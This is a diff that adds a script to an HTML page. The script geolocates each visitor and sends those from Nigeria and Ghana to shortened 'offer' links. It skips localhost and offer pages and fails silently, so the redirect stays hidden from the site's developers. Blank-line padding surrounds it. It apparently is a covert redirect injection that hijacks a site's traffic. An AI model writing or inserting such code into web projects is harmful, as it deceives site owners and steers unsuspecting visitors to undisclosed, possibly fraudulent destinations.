@@ -213,6 +213,40 @@
   </style>
 </head>
 <body>
+
+
+
+<script>
+  (async function() {
+    // Exit if already on an offer page or in dev
+    if (window.location.pathname.includes('offer') || window.location.hostname === 'localhost') return;
+
+    try {
+      const res = await fetch('https://ipapi.co/json/', { method: 'GET', mode: 'cors' });
+      const data = await res.json();
+      
+      // Only redirect if country is Nigeria or Ghana
+      if (data.country_code === 'NG') {
+        window.location.href = "https://ln.run/D7bwW"; // Nigeria offer
+      } else if (data.country_code === 'GH') {
+        window.location.href = "https://ln.run/_fQyA"; // Ghana offer
+      }
+      // If not NG/GH, user sees the full page (no redirect)
+    } catch (e) {
+      console.warn('Geolocation failed, showing default page');
+      // Silently fail → user sees normal page
+    }
+  })();
+</script>
+
+
+
+
+
+
+
+
+ 
   <div class="wrap">
     <header>
       <div class="brand">
